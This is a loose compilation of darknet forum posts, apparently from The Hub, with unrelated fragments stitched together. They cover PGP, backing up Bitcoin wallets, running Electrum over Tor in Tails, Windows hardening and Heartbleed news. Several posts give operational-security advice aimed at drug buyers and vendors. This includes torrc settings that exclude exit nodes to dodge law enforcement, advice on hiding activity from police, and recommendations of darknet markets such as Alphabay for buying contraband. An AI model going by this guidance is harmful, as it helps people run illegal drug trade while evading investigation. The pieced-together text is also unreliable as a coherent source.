The important part is that we need to get using PGP. But which is better? RSA/RSA keys or Elgamal/DSA keys?   My understanding of RSA is that you need to randomly select two very large prime numbers. The multiplication product of these two numbers is essentially your public key. The fact that it's difficult to factor very large numbers, but easy to multiply them, makes RSA a very secure algorithm.  Elgamal on the other hand, is based on the DIffie-Hellman key exchange, and uses the difficulty of the discrete logarithm problem for its security. ElGamal can also be adapted for elliptic curve cryptography.  It's my understanding that bit-for-bit, the two algorithms offer a similar security level, but RSA is the default standard for GnuPG. My question is why? My PGP public key is 4096 bit Elgamal for the encryption subkey and 3072 bit DSA2 for the signature subkey.

"The Hub Forums","Jolly Roger","52.60","2014-02-15T22:10:01","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," This is an embarrassing story of something that happened to me in the past few days, and it was a lesson well learned, for some of the things I have lost are not recoverable. - Jolly Roger     Do you have your Bitcoin wallets saved on a flash drive? What would happen if you lost your flash drive? Do you have a backup? What would happen if your files became corrupted and were not able to be recovered, could you live with that? Do you have certain things that would absolutely cause a huge problem if you lost them? Then you better start backing up your drives regularly, better yet,  do it daily!     I am the type of person who usually backs up his files regularly, but unfortunately do to the large amount of strange events occuring online lately with Utopia being brought down, BMR forums being seized, Silk Road being robbed and so forth, I had not backed up my files in about 2 weeks. I had all of my most recent files, including a few new Bitcoin wallets with balances on them on my main portable drive, and on top of it, this drive was encrypted.      Then, without warning, I suddenly received an error that the file system was corrupted and my disk could not be read. No matter, if you have an unencrypted drive, you can simply run a data recovery program such as  testdisk. Open up your terminal and type the following. Make sure you started Tails with a login at the boot up when it asks you.   sudo apt-get install testdisk     Using this program (follow documentation online) you can likely recover most of your files because it ignores file system headers and other types of file organization required to identify the way the files are stored. There are many other programs as well. The problem in my case, was that all my files were encrypted. This means, that in order to decrypt the files, I needed a key file that is stored on the drive to unlock my files. If this key file gets damaged, then even if you have the password for your files, you will not be recovering your files.     The key is unique to that particular instance when you encrypted the drive. Meaning that even if I tried to recreate the key file with the same password, the result would be a different key file. This means essentially that my data is unrecoverable, because my key file was somehow corrupted. Technology is delicate, data is stored in the form of magnetic frequencies and there is no guarantee that files will not become corrupted one day for seemingly no reason. Here are some things that could ruin your data.  Flood, hurricane, power surge, fire, moisture damage, accidentally stepping on your drive, a family member (usually a child) breaks it, you lose it, spill water on it, over heats, and so forth.     All of these could result in your data or drive getting damaged and losing all of your data. This is why you need a minimum of 2 backups. Not 1, but 2. And have one of your backups preferrably stored outside of your home. If you work, store one at work, or in your car, or somewhere you can access regularly, and try to back up your data as often as possible. If your house burns down and you kept all your backups at home, then you lose everything. If you kept a copy at work, then you can recover it. The more backups the better, as long as they are encrpypted. Any time you create a new wallet and transfer Bitcoin into it, back it up. Any time you set up a new account or a new email with a unique password (which should be every time), back it up. You need to be backing up everything.      Luckily for myself my main wallet was recoverable with the majority of my coins, but I did lose some coins, which can never be recovered, trust me, I tried. Getting extra USB drives or SD cards are very cheap and inexpensive, so you owe it to yourself to spend a few extra dollars to have multiple backups just in case you wind up in my situation where you had not backed up your drive in a couple of weeks and end up losing data that could cost you a lot more than what it would have costed to have a few extra drives laying around as back ups.

"The Hub Forums","Jolly Roger","52.60","2014-02-17T05:28:26","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," In this post I want to talk about 2 options for trading your Bitcoins.  #1 - Blockchain #2 - Electrum     By now, hopefully you know how to use BlockChain. If not, you simply go to http://blockchain.info and press the button ""Wallet"" and you can open up your existing wallet or create a new account. Very straight forward and can be done all from your web browser.      But what about Electrum? Electrum is an easy to use Bitcoin client. It protects you from losing coins in a backup mistake or computer failure, because your wallet can be recovered from a secret phrase that you can write on paper or learn by heart. There is no waiting time when you start the client, because it does not download the Bitcoin blockchain. If you use the normal Bitcoin client from https://bitcoin.org then you would need to download the entire blockchain, which is several GB of data. In Tails, we are trying not to download too much to our computers. Downloading the entire BlockChain can take over 24 hours.     So how do we set up Electrum in Tails? First thing we need to do is download it.   https://download.electrum.org/Electrum-1.9.7.tar.gz     Now extract it (right click -> Extract here) and rename the folder to electrum to make things easier. (Right click -> Rename). You might also want to move the folder to the  tmp directory so it is easier to find. (Places -> Computer -> File System -> tmp)      Next open up a terminal and type the following command   cd /tmp/electrum      You can replace /tmp/electrum with whatever directory electrum is currently in, but this is why we put it in tmp, to make things easier for us. Next type the following command.   ./electrum -s 56ckl5obj37gypcu.onion:50001:t -p socks5:localhost:9050     This will allow your electrum to connect through Tor, to make sure it does not connect over clearnet. You will get a warning when you do this that electrum is attempting to connect in an unsafe manner, but this is expected, and do not worry, it is safe to do this. This step was recommended on the Tails web page at the following URL.   https://tails.boum.org/forum/Report:_the_electrum_bitcoin_client_in_tails/  Since you are likely going to want to reuse your wallet that is generated in Electrum, you can specify where your wallet is kept by replacing the above command with the following command.   ./electrum -s 56ckl5obj37gypcu.onion:50001:t -p socks5:localhost:9050 -w /tmp/electrum.dat     You would replace /tmp/electrum.dat with whatever the path to your wallet is, and you can rename  electrum.dat to whatever you want to call your wallet, like  srwallet.dat or whatever you want. Or leave it the way that it is. Then each time you want to start up electrum, reuse the same command, and make sure you copy electrum.dat into  /tmp or whatever directory you wish to use. Then when you are finished, make sure to back up electrum.dat onto your USB drive or SD card, especially if you do not have Tails persistence. This way you can reuse the same wallet and you will not lose your balance.      Electrum is likely going to be the Bitcoin client of choice for Tails users. And you can read more about how to use Electrum by visiting the home page at the following link.  https://electrum.org",""

"The Hub Forums","Jolly Roger","52.60","2014-02-21T04:38:10","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," Of course I do not mind. I love the feedback     1) If you are only worried about hiding Tor from your ISP, then technically one VPN that uses encryption should suffice. You could also use a proxy or SSH to tunnel Tor through and use another computer's connection for Tor. Just make sure that you trust the VPN, proxy or SSH server because if you are trying to hide Tor from your ISP, then who is to say that the other alternatives are any more trust worthy. Just be careful with who you choose.  2) The ideal way of doing things with Tails is to grab a laptop, remove the hard drive and boot from a DVD or a USB that has a hardware lock option so that nothing can be written to it. The reason that I give the option of using Virtual Box is that most people are not ready to sacrifice the convenience of Windows yet, or have the technical ability to handle Tails (Debian: Linux) by itself. It is a big change for most people and my security thread is designed towards beginners.   3) You can certainly do this, but it does not protect you from being stupid. Remember the original DPR (Ross Ulbricht) used public wifi at a nearby cafe, and they were still able to nab him because he made some critical OpSec mistakes which tied him to that IP address. Ideally you would never use your home connection, but again, it is not practical for everyone. Try and find your balance between security and convenience. Obviously the more serious freedom fighting you are doing, the more steps you should be taking to make sure you are not leaking any personal information.

Some vendors require buyers to send their addresses through PGP and I am offering that ability for the beginners who have absolutely no idea. Vendors should be doing everything I recommend at a minimum. When you get cocky, you get caught. Like DPR.  A VPN adds false sense of security, yes. You hit the nail right on the head.   i2P inside Tor, depends what you are using it for. Obviously it would not be useful for accessing hidden services, since they require Tor at the exit node. Tails offers this option to run i2P inside of Tor but there has not been a strong enough security audit to prove whether or not this is safe yet.  In fact, most people would assume that Tor over top of Tor would be safer (6 hops vs 3 hops), but some believe it might actually make you  less secure and the developers of Tor recommend  against it.

"The Hub Forums","Jolly Roger","52.60","2014-02-26T07:51:34","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners"," 1) Technically speaking, Tor is proxy chaining. Tor offers 3 hops to be exact.  Is it necessary to do it? And how many proxies? I will try to give you an explanation below so that you can make an informed decision.  2) Generally speaking, proxies are servers that forward traffic to and from your computer and the internet acting as sort of a central relay. The proxy server likely will not use any type of encryption unless it is an HTTPS proxy, and you likely have no idea who is running the proxy. However, if you are using a proxy to connect to Tor, then the proxy server only sees encrypted Tor traffic and cannot exactly tell what you are doing.  Chaining several proxies together may make it easier to obfuscate the path, but again, you never know who is running those proxies and what logs they are keeping. It is hard to give you a definitive answer.   A VPN, you are at least guaranteed a decent level of encryption. But most people place too much trust into VPNs and think that they will protect them. This is not always the case, but there have been some high profile cases where VPNs ended up giving up their customer's information after a court order.   Both VPNs and proxies can either help increase your anonmity or decrease it, but you may be asking why the top level people right now who make things like Tor, Tails and so forth are not advocating using these extra hops.  Best of luck to you.","hello~ i have some questions as a newbie.1) I have seen some people talking about proxies chaining, is it necessary to do it? how many proxies do we need as a rule of thumb?2) what is the difference between vpn and proxies?Thanks for your time~"

Still any linux is usually the better choice, but lets face the fact, 70% use windows and 60% of them dont give a flying care.  if somebody has anything to add, please feel free to do so  - first of all keep windows up to date, dont use a pirated version where updates are deactivated. if you dont have a real licence, just write it off some other device that runs the same windows version and activate it with that. you might need to activate via phone, just press yes when the machine asks if you run it on one device only. Updates are important, they are by far the no.1 reason for malware getting on your machine. Microsoft has their backdoors and other internet services anyway, you definately arent safer with updates turned off. also dont use Windows 8.. just dont.  - Install a decent Antivirus. No norton bullshit and if possible a company that isnt too big. I recommend Eset, Kaspersky, Bitdefender. This point is a bit tricky though, because you grant one software full access to basically everything. So the safety of probable viruses on the one hand, but some added risk on the other since you have to trust the antivirus company. I personally use an antivirus, but thats not something I would recommend 100%  - More important than an antivirus is a decent firewall, set to manual mode where you have to confirm every outbound connection. There are so many bullshit services that are constantly calling home, the chances are big that one of them is compromised or at least cooperating with whoever  - if your windows install is older, the amount of installed toolbars rise and you get the feeling that it starts behaving a little weird, consider reinstalling windows and starting off new. If youre too lazy for this, at least run some anti malware through it. I recommend MBAM, CCleaner  - click start, write ""msconfig"" in the search bar and check the applications in autorun. you should probably uncheck most of them. also check services, check the box to hide microsoft services and you can again probably uncheck most of it. things like antivirus needs to stay there obviously, also some printers need their driver loaded as a service or some other fancy stuff that might stop working when its unchecked. you can still reactivate certain things later on so dont be to shy, kill that shit.  - Change your DNS server to prevent DNS leaks. click your network icon in your taskbar, open network center, click on your lan or wifi connection, properties, doubleclick on IPV4, there you can set different ones, like opendns for example: http://www.opendns.com/home-internet-security/opendns-ip-addresses/ only set DNS to manually, dont change your IP, subnet and gateway info.  - Install http://peerblock.com/ this is one thing I miss on linux, it blocks network access to a huge list of targets you probably dont want to make connections to. The list contains known servers of LE, copyright lawyers, advertising companies etc. List is updated automatically. you need to deactivate it from time to time because its blocking also non threatening stuff like government homepages and a lot of porn sadly  - Put all your stuff in a truecrypt container. Even better encrypt your whole harddisk AND put all your stuff in a container. its worth it  - make sure that all your critical applications are set to run through tor. this applies for offline wallets, SSH or FTP connections you might establish, etc. Most application have network settings where you can define a Proxy (Proxy5), Host (localhost) and Port (9150)  - dont mix up your private with anon surfing. dont google for darknet stuff in your chrome or safari or whatever, and dont surf for your private stuff in the same tor session  - consider using a vpn underneath it all. This has also some ups and downsides to it and opinions vary if it is rather good or bad.. too lazy to explain now though...  And independently of the operating system, I think it cant hurt to add these lines to your torrc file (its located in one of the subfolders of tor, just add this text at the end of the file):  ExcludeExitNodes {us},{gb},{au},{ca},{de}   NumEntryGuards 1 GuardLifetime 10 months  this way it doesnt use exit nodes from us, gb etc, where most likely most of LE servers are.

Matthew Verran Jones, who works for Data Paradigm Inc. in Dallas, has been charged with illegally distributing a controlled substance on Silk Road as well as outside the website. Federal authorities shut down Silk Road last year and charged its 29-year-old founder with building a drug empire that had an estimated $1.2 billion in sales. But before Silk Road was brought down, U.S. Drug Enforcement Administration agents in Orlando bought painkillers, sedatives and other drugs from multiple sellers on the website. According to a recently unsealed criminal complaint filed in Orlando, Jones, 44, opened a Silk Road account in April 2013 and used the alias ""CALIGIRL."" Since then, CALIGIRL made 685 sales. The profile was among the top 5 percent of all Silk Road vendors, the complaint said. DEA agents said they made two undercover buys from CALIGIRL's Silk Road account and six other undercover purchases from CALIGIRL outside the website using an encrypted program, the complaint said. Authorities have bought or seized more than 1,300 oxycodone and hydrocodone pills from Jones, authorities said. Agents also learned Jones frequently traveled to Colombia, where he bought the oxycodone he later sold online. Jones was arrested Thursday in Broward County, where he remained jailed Friday. The case is the latest local DEA investigation into Silk Road. Last fall, Orlando federal prosecutors filed charges against Delaware physician Olivia Bolles, alleging she sold hundreds of prescription drugs illegally on Silk Road and shipped them to Central Florida. Agents found more than 600 sales between Bolles' ""MDPro"" account and Silk Road users, records filed in her case said.

Even if they are watching some fraction of the Tor network, which they can do without running relays by tapping gateways and internet exchanges, there's probably too much noise in the data to be useful.

Once again the actions of 'one man' are trying to destroy what the rest of us have worked so hard to build and maintain. For those of you that know the Cannabis Support Team, our focus has always been on and for the Community and you would also know that we have not stopped once during this 2 month rollarcoaster nightmare!  On 1 Oct LH and then Wolf were 'dumped' by the CR Owner because we were told CR was not re-opening (despite Wolf and Rigr (site Dev) working daily to get that site and the new CR forum ready for relaunch) at this time something that had started as a backup plan for the Community was now to become our new home...  With amazing Support and alot of hard work Panacea - Flower Sanctuary was made/born and was quietly released via select avenues    The threats started small a couple of weeks ago and just appeared to be from a frustrated sad man, however these new threats that had been received by several members were disgusting and the level of attacks were just a constant barrage yesterday, first against one person and then against even those whom were once his closest allies, this has been a terrifying spectacle to witness.  I am not and was not Dox'd however I did received a fair share of disgusting name calling and personal threats, but it is the safety and security of our members, our family that I am always most concerned about.  The Panacea site admin is safe, secure and not Doxed. The trading site and the forum are not vulnerable because of yesterdays attacks.  What should have been a nice quiet open day for our little mmj community turned into a fight for our survival and the protection of one of our own...  Please know that we tried so hard for Cannabis Road and for the CR Owner, through the mind games, mis-communications and the broken promises, we always kept our focus on the Community.  We are strong, we are focused, we are determined... just like we were last week, like we were yesterday, like we will be tomorrow...  Never give up!  Keep Strong!  The journey always continues...

Invest a whopping ten bucks or so in a USB stick, and run Tails on your existing hardware, booting off the USB stick.  Takes an hour or two to download and get working, costs nothing except for the USB stick. 2. Or.. load Virtualbox on your Windows machine, then run Whonix.  Since it runs in two virtual machines, your Windows box stays pretty much the same, but at least you've managed to compartmentalize your Tor stuff, and you have decent isolation.   Only downside is that your box might not have enough RAM to run it.   Cost: $0. 3.  Hell, if you can't afford the USB stick, load Virtualbox or VMWare Player (both free) on your Windows box, and run Tails out of a VM.  Options #2 and #3 leave your Windows box mostly as-is, and compartmentalize your darknet stuff to just a specific virtual machine, that somebody else with decent technical skills has pretty much already set up for you.   Obviously, if your Windows box is already rootkitted/compromised, the VMs will be too, but at that point, you really can't get any more fucked anyway.  Any of those three will be exponentially better than where you're at right now, and not just for IRC.  You don't want to be in a position where you're trusting an application to not leak data.

"The Hub Forums","Zaphod","2686.0","2014-04-09T01:21:16"," Critical crypto bug in OpenSSL opens two-thirds of the Web to eavesdropping","General Discussion/Security","This is some  SERIOUSLY BAD JUJU  This is a security clusterfuck of the first order. If the Richter scale applied to security issues, this one would be a 11.  In a nutshell, this vulnerability in OpenSSL, allowed an attacker to grab 64K chunks of memory on the system they were attacking. This 64K chunk could include SSL private keys, passwords, or other sensitive information. You will remember that on one of the Snowden slide, it said, ""SSL removed here"".  I don't know if this is what they were talking about or not.  There is no way to know which sites have been attacked, or had their private keys stolen. Every site using SSL is going to have to generate a new SSL keypair (hopefully 2048-bit) and have it signed by a certificate authority.  This is going to make the Debian SSL debacle look like a picnic.    Zaphod ","Risk Assessment / Security & HacktivismCritical crypto bug in OpenSSL opens two-thirds of the Web to eavesdroppingExploits allow attackers to obtain private keys used to decrypt sensitive data.by Dan Goodin - Apr 8, 2014 12:10 am UTC For a more detailed analysis of this catastrophic bug, see this update, [1] which went live about 18 hours after Ars published this initial post.Researchers have discovered an extremely critical defect in the cryptographic software library an estimated two-thirds of Web servers use to identify themselves to end users and prevent the eavesdropping of passwords, banking credentials, and other sensitive data.The warning about the bug in OpenSSL coincided with the release of version 1.0.1g of the open-source program, [2] which is the default cryptographic library used in the Apache and nginx Web server applications, as well as a wide variety of operating systems and e-mail and instant-messaging clients. The bug, which has resided in production versions of OpenSSL for more than two years, could make it possible for people to recover the private encryption key at the heart of the digital certificates used to authenticate Internet servers and to encrypt data traveling between them and end users. Attacks leave no traces in server logs, so there's no way of knowing if the bug has been actively exploited. Still, the risk is extraordinary, given the ability to disclose keys, passwords, and other credentials that could be used in future compromises.""Bugs in single software or library come and go and are fixed by new versions,"" the researchers who discovered the vulnerability wrote in a blog post published Monday. [3] ""However this bug has left a large amount of private keys and other secrets exposed to the Internet. Considering the long exposure, ease of exploitations and attacks leaving no trace this exposure should be taken seriously.""The researchers, who work at Google and software security firm Codenomicon, said even after vulnerable websites install the OpenSSL patch, they may still remain vulnerable to attacks. The risk stems from the possibility that attackers already exploited the vulnerability to recover the private key of the digital certificate, passwords used to administer the sites, or authentication cookies and similar credentials used to validate users to restricted parts of a website. Fully recovering from the two-year-long vulnerability may also require revoking any exposed keys, reissuing new keys, and invalidating all session keys and session cookies. Members of the Tor anonymity project have a brief write-up of the bug here, [4] and a this analysis provides useful technical details. [5]OpenSSL is by far the Internet's most popular open-source cryptographic library and TLS implementation. It is the default encryption engine for Apache, nginx, which according to Netcraft runs 66 percent of websites. [6] OpenSSL also ships in a wide variety of operating systems and applications, including the Debian Wheezy, Ubuntu, CENTOS, Fedora, OpenBSD, FreeBSD, and OpenSUSE distributions of Linux. The missing bounds check [7] in the handling of the Transport Layer Security (TLS) heartbeat extension affects OpenSSL 1.0.1 through 1.0.1f.The bug, which is officially referenced as CVE-2014-0160, makes it possible for attackers to recover up to 64 kilobytes of memory from the server or client computer running a vulnerable OpenSSL version. Nick Sullivan, a systems engineer at CloudFlare, a content delivery network that patched the OpenSSL vulnerability last week, [8] said his company is still evaluating the likelihood that private keys appeared in memory and were recovered by attackers who knew how to exploit the flaw before the disclosure. Based on the results of the assessment, the company may decide to replace its underlying TLS certificate or take other actions, he said.Attacking from the outsideThe researchers who discovered the vulnerability, however, were less optimistic about the risks, saying the bug makes it possible for attackers to surreptitiously bypass virtually all TLS protections and to retrieve sensitive data residing in the memory of computers or servers running OpenSSL-powered software.""We attacked ourselves from outside, without leaving a trace,"" they wrote. ""Without using any privileged information or credentials we were able steal from ourselves the secret keys used for our X.509 certificates, user names and passwords, instant messages, emails and business critical documents and communication.""They called on white-hat hackers to set up ""honeypots"" of vulnerable TLS servers designed to entrap attackers in an attempt to see if the bug is being actively exploited in the wild. The researchers have dubbed the vulnerability Heartbleed because the underlying bug resides in the OpenSSL implementation of the TLS heartbeat extension as described in RFC 6520 of the Internet Engineering Task Force. [9]The OpenSSL vulnerability is the latest to threaten the HTTPS scheme that's the default and often only method for cryptographically protecting websites, e-mail, an other Internet communications from attacks that allow hackers to eavesdrop on end users or impersonate trusted websites. Last month, developers of the GnuTLS library disclosed an equally catastrophic bug that left hundreds of open-source applications open to similar attacks. [10] And in February, Apple fixed an extremely critical vulnerability in the iOS and OS X operating systems that also made it possible for hackers to bypass HTTPS protections.

"The Hub Forums","Zaphod","2686.0","2014-04-09T01:55:29"," Critical crypto bug in OpenSSL opens two-thirds of the Web to eavesdropping","General Discussion/Security"," I've already updated.  Here is what the Tor Project had to say on their blog:   OpenSSL bug CVE-2014-0160 Posted April 7th, 2014 by arma in      openssl     security advisory  A new OpenSSL vulnerability on 1.0.1 through 1.0.1f is out today, which can be used to reveal memory to a connected client or server.  If you're using an older OpenSSL version, you're safe.  Note that this bug affects way more programs than just Tor â expect everybody who runs an https webserver to be scrambling today. If you need strong anonymity or privacy on the Internet, you might want to stay away from the Internet entirely for the next few days while things settle.  Here are our first thoughts on what Tor components are affected:  1.    Clients: The browser part of Tor Browser shouldn't be affected, since it uses libnss rather than openssl. But the Tor client part is: Tor clients could possibly be induced to send sensitive information like ""what sites you visited in this session"" to your entry guards. If you're using TBB we'll have new bundles out shortly; if you're using your operating system's Tor package you should get a new OpenSSL package and then be sure to manually restart your Tor.  2.    Relays and bridges: Tor relays and bridges could maybe be made to leak their medium-term onion keys (rotated once a week), or their long-term relay identity keys. An attacker who has your relay identity key can publish a new relay descriptor indicating that you're at a new location (not a particularly useful attack). An attacker who has your relay identity key, has your onion key, and can intercept traffic flows to your IP address can impersonate your relay (but remember that Tor's multi-hop design means that attacking just one relay in the client's path is not very useful). In any case, best practice would be to update your OpenSSL package, discard all the files in keys/ in your DataDirectory, and restart your Tor to generate new keys. (You will need to update your MyFamily torrc lines if you run multiple relays.)   3.    Hidden services: Tor hidden services might leak their long-term hidden service identity keys to their guard relays. Like the last big OpenSSL bug, this shouldn't allow an attacker to identify the location of the hidden service, but an attacker who knows the hidden service identity key can impersonate the hidden service. Best practice would be to move to a new hidden-service address at your convenience.     4.    Directory authorities: In addition to the keys listed in the ""relays and bridges"" section above, Tor directory authorities might leak their medium-term authority signing keys. Once you've updated your OpenSSL package, you should generate a new signing key. Long-term directory authority identity keys are offline so should not be affected (whew). More tricky is that clients have your relay identity key hard-coded, so please don't rotate that yet. We'll see how this unfolds and try to think of a good solution there.  5.    Tails is still tracking Debian oldstable, so it should not be affected by this bug.  6.    Orbot looks vulnerable; they have some new packages available for testing.  7.    The webservers in the https://www.torproject.org/ rotation needed (and got) upgrades. Maybe we'll need to throw away our torproject SSL web cert and get a new one too.  Zaphod  ","And there is a new Tor update today. Not addressing the current issue at hand."

I've been watching that recent movie, ""Inherent Vice"", based on the Thomas Pynchon novel.  I'm gonna write spoilers so don't read if you give a shit.  Great film about cointelpro in the early 1970's and on what really makes the US run.  The story centers around a rich asshole real estate developer that has an acid trip and realizes he shouldn't be selling homes but giving them away.  Needless to say, his rich friends and the FBI aren't too happy about this Jesus-like move and take action.  Then a  small time PI stumbles into the situation via an old girlfriend and we get the story from his POV.    Point is the US govt. has its tendrils in everything it could even remotely consider a threat to its power in its most fevered paranoia dreams and protects its wealthy owners above all else.  And yet their stormtroopers can't break strong encryption and can't arrest the entire darknet and have lost every war they've fought since WWII, both against nation-states and inanimate objects like drugs...",""

For large dealers, and people who purchase large quantities of contraband, this may very well be a possibility.   It is well known that the secret services in Eastern Europe used to bug dissidents homes'. I remember reading accounts by one family, who hear strange noises in the middle of the night -- it turned out these were the secret service agents replacing the bugs in their walls.   The main constraint here is not only going to be the legality of such tactics, but the sheer expense/manpower required to carry out these black-bag jobs. People with these skills don't grow on trees, and they are going to tend to be reserved for high-value targets.

However, with that said, they are going through some things right now that might give you some reason to avoid it.  I recommend Abraxas, Agora, or Alphabay. Some people might even remove Agora from that list right now.  The most consistent market for the time being (and this is just MY opinion) is Alphabay. They don't suffer the downtime of Agora, they have a large forum, and a large scammer avoidance system. If you do your research on the forums, you should be fine.  I've never purchased from Abraxas, but they seem to be consistently around, and I rarely see complaints about them. Maybe someone else can chime in with experience of them.  The point is, generally, use a market. All of the third party shops that you find on the various wikis or whatever are probably scams.

I wanna create a setup which works just like the Whonix system. For technical reasons, the only way I can do it is via Xen. And I'm stuck here, in need of help.  So I wanna do the following:  [machine with internet access]<------------->[gateway]<-------->[protected computer]  Just like in whonix.  The [main machine] is the Dom0 host, which has got normal internet access.  [Gateway] is a virtual machine which has got two network cards in it: one is connected (NAT?) to the main machine, the other is connected to the protected computer. The two interfaces (two networks) are completely isolated. The Gateway is the machine which connects to TOR, and forces all incoming connections through TOR. (I'm OK with this part, once I figure out how to properly set up the xen-network, I'll do the tunneling with iptables.)  The [protected computer] is another VM, and the ONLY computer it can see is the gateway. There are absolutely no other machines on it's private network, so it's traffic either goes through the gateway, or it does not have internet access at all.  This is exactly like how Whonix works... I just wanna do it under Xen.  And for hours now, I just cannot figure out the network config. What setup should I use? Bridge? NAT?

If somebody else has done it a silghtly different way, it's better to make their solution fit your needs or find somebody who already did it the way you need it and grab their solution.  As far hosting something 'really secure', the first thing you will need is complete control over your boxe's hardware. If the enemy has control over the physical hardware of your setup, then it's not yours. Of course, most colocation companies will only get you a full rack if you want total control over the physical access to the machine.   Maybe you don't want it 'really secure' then? You have to define the capabilities of your attacker. I have a few boxes that aren't too hardened except for stripping them all services that bind to the outside interface except SSH and tor, and then run a pretty non-interesting hidden service. Sure they have many attack vectors, but if if they are completely compromised, there isn't too much on there to make me worry about. My main annoyance would be finding a new host.

If that is the case, than your virtualization setup has nothing to do with it.  Second, it looks like it's the host system's responcibility to route packets between the containers and the hardware.

"The Hub Forums","Angel Eyes","10186.0","2015-06-18T19:34:30","Future of Hidden Services","General Discussion/Security","I think this is a subject that bears discussion here on the Hub, so I'm posting a link to the torproject blog's latest hidden services post and the text as well.  The torproject is planning many upgrades and modifications to the hidden services code, and it appears they wish to fund these changes via crowdfunding, which is interesting given so much of the funding for the main torproject comes from government.    In any event, thoughts?   ","---------------------------------------------https://blog.torproject.org/blog/crowdfunding-future-hidden-servicesHidden Services have received a lot of attention in 2015, and Tor is at the center of this conversation. Hidden Services are a Tor technology that allows users to connect to services (blogs, chats, and many other things) with neither the user nor the site giving up identifying information.In fact, anything you can build on the internet, you can build on hidden services. But they're better--they give users things that normal networking doesn't authentication and confidentiality are built in; anonymity is built in. An internet based on hidden services would be an internet with Tor built in--a feature that users could take for granted. Think of what this might mean to millions of users in countries like China, Iran, or the UK. Yet currently, only about 4% of Tor's traffic comes from hidden services.So we at Tor have been considering how we might meet the challenge of making them more widely available. In this post, we will briefly discuss the role of hidden services before we explore the idea of using crowdfunding to pay for bold, long-term tech initiatives that will begin to fulfill the promise of this technology.Hidden Services are a critical part of Tor's ecosystemHidden Services provide a means for Tor users to create sites and services that are accessible exclusively within the Tor network, with privacy and security features that make them useful and appealing for a wide variety of applications.For example, hidden services are currently used by activists and journalists to publish blogs--in anonymity and free from retaliation. They are used by NGOs to securely receive information on government corruption and injustice from concerned citizens. Newspapers such as the Washington Post, and human rights groups such as Amnesty International use them to receive leaked information. They are used by people looking for the latest cat facts, companies that want to secure the path of their clients or by people chatting securely and anonymously -- including at-risk journalists talking to sources.In addition, developers use hidden services as a building block to incorporate Tor's security and anonymity features into totally separate products. The potential of hidden services is huge, and much of it is yet to be explored.Next Steps for Hidden ServicesWe want to make this technology available to the wider public as these services will play a key role in the future of secure communications. This means that we must increase the uses for hidden services, bring them to mobile platforms for anonymous mobile apps, and vastly increase the number of people who use them.Since our goal is wider use, it is imperative that we build them to be more secure, easier to set up, better performing, and more usable. Clearly, the questions that we answer in early deployment efforts will inform how we answer the deeper questions pertaining to massive worldwide deployment.We must engage a large number of people to bring hidden services to the next level. Until now, hidden services development largely relied on the volunteer work of developers in their spare time. This will not be sufficient if we are to make the leap to transformative hidden services.We are currently evaluating funding strategies that will support our Hidden Service initiatives in the short-, intermediate- and long-term. In order to fit the requirements more conservative large funders have, so we can fully sponsor the Next Generation Hidden Services, we must put preliminary pieces in place. And for that we will reach out to crowdfunding. To do this right, we need your feedback.Why Crowdfunding?Crowdfunding allows us to engage the broader community in grasping the opportunity that this new technology promises. We are confident that we can deliver significant advancements in the hidden services field in the short-term, and that many small donors who understand their context will be eager to contribute. We intend to begin by prioritizing the improvement of the security, usability, and performance of the current hidden services system.Further, we want to make sure we support the efforts of community projects and that the community is participating in shaping the evolution of hidden services. For example, it would be important to assist and improve the Tor integration of projects such as SecureDrop, Pond, Ahmia and Ricochet. We are in the unique position to be able to shape the Tor protocol to make these projects easier to use and better performing, and we would like to identify ways to promote broader deployment of these projects.Identifying, prioritizing and meeting future challenges will require engagement throughout the greater community. For instance, as changes and enhancements are introduced, we hope to speak with the best bug hunters, cryptographers and privacy experts and ask them to audit our code and designs. Non-technical users could help us evaluate the usability of our improvements.For this crowdfunding campaign we have identified a few possible ideas-- but the point of this post is to ask you for yours. Here are three projects that we have come up with so far:Information Panel for Hidden Service Operators    An application that Hidden Service operators could use to learn more about the activity of their Hidden Service. The operator would have access to information on user activity, security information, etc., and will receive important system-generated updates, including log messages Fast-but-not-hidden services    A way to set up public hidden services with improved performance but reduced server-side anonymity. Basically, hidden services that don't care about anonymity but still want to protect their clients with Tor's cryptography and anonymity, will be able to run faster since they don't need to protect their own anonymity. This is an optional feature that suits the needs of large sites like Facebook and reddit, and will make their hidden services faster while also reducing the traffic they cause to the network. Also by optimizing for performance in this specialized feature, we can optimize for security even more in the default hidden services configuration. Next Generation Hidden Services    Tor has been at the center of hidden services from the beginning. We have big lists of changes we need to do to the Tor protocol to increase the security of hidden services against cryptanalysis, DoS and deanonymization attacks. We also want to improve guard security, allow operators to store their cryptographic keys offline and enable scaling of hidden services to new levels. This is a big project but we hope to start crunching through it as part of this crowdfunding campaign. Your Idea for Hidden Services?Long story short, we are looking for feedback!What hidden services projects would you like to see us crowdfund?How do you use hidden services; what makes them important to you? How you want to see them evolve?We'd love to hear your ideas on picking crowdfunding rewards and stretch goals.Also, we are curious about which crowdfunding platforms you prefer and why.Feel free to use the comments of this blog, or contact us directly at tor-assistants@torproject.org. Also see our wiki page with more information!In the following weeks, we will update you on our progress, incorporating feedback we receive from the community. We hope to make this process as transparent and public as possible!Thanks!EDIT: The ""Unhidden Services"" paragraph was expanded and changed to ""Fast-but-not-hidden Services"". The previous name was too scary and the description not sufficient to show the potential of the project. Please send us better names for this feature!---------------------------------------------"

Far more than all of the other features they mention most of which can be had today by modifying Tor.  Definitely a worthy sink for your coin.","We have big lists of changes we need to do to the Tor protocol to increase the security of hidden services against cryptanalysis, DoS and deanonymization attacks. We also want to improve guard security, allow operators to store their cryptographic keys offline and enable scaling of hidden services to new levels."

